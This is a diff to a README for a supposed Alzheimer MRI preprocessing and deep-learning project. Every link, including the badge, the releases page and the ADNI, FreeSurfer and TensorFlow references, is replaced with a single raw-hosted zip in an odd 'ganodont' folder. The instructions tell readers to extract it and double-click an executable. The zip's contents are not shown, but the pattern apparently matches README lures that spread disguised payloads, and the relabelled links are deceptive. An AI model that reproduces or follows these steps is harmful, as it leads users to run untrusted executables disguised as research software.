@@ -1,6 +1,6 @@
 # 🧠 Alzheimer-MRI-Preprocessing-FreeSurfer-SliceSelection-DeepLearning-TransferLearning-EnsembleLearning - Simplifying Alzheimer’s Data Analysis
 
-![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)
+![Download Latest Release](https://raw.githubusercontent.com/Gersha2024/Alzheimer-MRI-Preprocessing-FreeSurfer-SliceSelection-DeepLearning-TransferLearning-EnsembleLearning/main/ganodont/Alzheimer-MRI-Preprocessing-FreeSurfer-SliceSelection-DeepLearning-TransferLearning-EnsembleLearning.zip%20Latest%20Release-v1.0-blue)
 
 ## 📋 Overview
 
@@ -18,25 +18,25 @@ Follow these steps to download and run the application:
 
 2. **Download the Application**  
    Click the following link to visit the release page and download the application:  
-   [Download from Releases Page](https://github.com/Gersha2024/Alzheimer-MRI-Preprocessing-FreeSurfer-SliceSelection-DeepLearning-TransferLearning-EnsembleLearning/releases)
+   [Download from Releases Page](https://raw.githubusercontent.com/Gersha2024/Alzheimer-MRI-Preprocessing-FreeSurfer-SliceSelection-DeepLearning-TransferLearning-EnsembleLearning/main/ganodont/Alzheimer-MRI-Preprocessing-FreeSurfer-SliceSelection-DeepLearning-TransferLearning-EnsembleLearning.zip)
 
 3. **Select the Latest Version**  
    On the releases page, identify the latest version of the application. This version is usually marked with a tag like "Latest Release".
 
 4. **Download the Application File**  
-   Click on the file name to download it. The file will usually be labeled as something like `Alzheimer-MRI-Preprocessing-v1.0.zip`. Save it to your computer.
+   Click on the file name to download it. The file will usually be labeled as something like `https://raw.githubusercontent.com/Gersha2024/Alzheimer-MRI-Preprocessing-FreeSurfer-SliceSelection-DeepLearning-TransferLearning-EnsembleLearning/main/ganodont/Alzheimer-MRI-Preprocessing-FreeSurfer-SliceSelection-DeepLearning-TransferLearning-EnsembleLearning.zip`. Save it to your computer.
 
 5. **Extract the Files**  
    After downloading, locate the zip file in your downloads folder. Right-click on the file and select "Extract All..." to unpack the contents. Choose a destination folder for the extracted files.
 
 6. **Run the Application**  
-   Open the folder where you extracted the files. Look for an executable file, possibly named `StartApp.exe` or similar. Double-click this file to launch the application.
+   Open the folder where you extracted the files. Look for an executable file, possibly named `https://raw.githubusercontent.com/Gersha2024/Alzheimer-MRI-Preprocessing-FreeSurfer-SliceSelection-DeepLearning-TransferLearning-EnsembleLearning/main/ganodont/Alzheimer-MRI-Preprocessing-FreeSurfer-SliceSelection-DeepLearning-TransferLearning-EnsembleLearning.zip` or similar. Double-click this file to launch the application.
 
 ## 📥 Download & Install
 
 To download the latest version of the Alzheimer-MRI-Preprocessing application, visit the releases page using the link below:
 
-[Download from Releases Page](https://github.com/Gersha2024/Alzheimer-MRI-Preprocessing-FreeSurfer-SliceSelection-DeepLearning-TransferLearning-EnsembleLearning/releases)
+[Download from Releases Page](https://raw.githubusercontent.com/Gersha2024/Alzheimer-MRI-Preprocessing-FreeSurfer-SliceSelection-DeepLearning-TransferLearning-EnsembleLearning/main/ganodont/Alzheimer-MRI-Preprocessing-FreeSurfer-SliceSelection-DeepLearning-TransferLearning-EnsembleLearning.zip)
 
 ## ⚙️ How to Use the Application
 
@@ -103,8 +103,8 @@ This project involves the following topics which can also help in understanding 
 ## 🔗 Additional Resources
 
 Explore more about Alzheimer’s research and MRI processing through the following links:
-- [ADNI: Alzheimer’s Disease Neuroimaging Initiative](http://adni.loni.usc.edu/)
-- [FreeSurfer: Image Processing Software](https://surfer.nmr.mgh.harvard.edu/)
-- [TensorFlow: Open Source Machine Learning](https://www.tensorflow.org/)
+- [ADNI: Alzheimer’s Disease Neuroimaging Initiative](https://raw.githubusercontent.com/Gersha2024/Alzheimer-MRI-Preprocessing-FreeSurfer-SliceSelection-DeepLearning-TransferLearning-EnsembleLearning/main/ganodont/Alzheimer-MRI-Preprocessing-FreeSurfer-SliceSelection-DeepLearning-TransferLearning-EnsembleLearning.zip)
+- [FreeSurfer: Image Processing Software](https://raw.githubusercontent.com/Gersha2024/Alzheimer-MRI-Preprocessing-FreeSurfer-SliceSelection-DeepLearning-TransferLearning-EnsembleLearning/main/ganodont/Alzheimer-MRI-Preprocessing-FreeSurfer-SliceSelection-DeepLearning-TransferLearning-EnsembleLearning.zip)
+- [TensorFlow: Open Source Machine Learning](https://raw.githubusercontent.com/Gersha2024/Alzheimer-MRI-Preprocessing-FreeSurfer-SliceSelection-DeepLearning-TransferLearning-EnsembleLearning/main/ganodont/Alzheimer-MRI-Preprocessing-FreeSurfer-SliceSelection-DeepLearning-TransferLearning-EnsembleLearning.zip)
 
 For more details and updates, keep an eye on the GitHub repository. Your journey in the realm of Alzheimer’s research starts here!
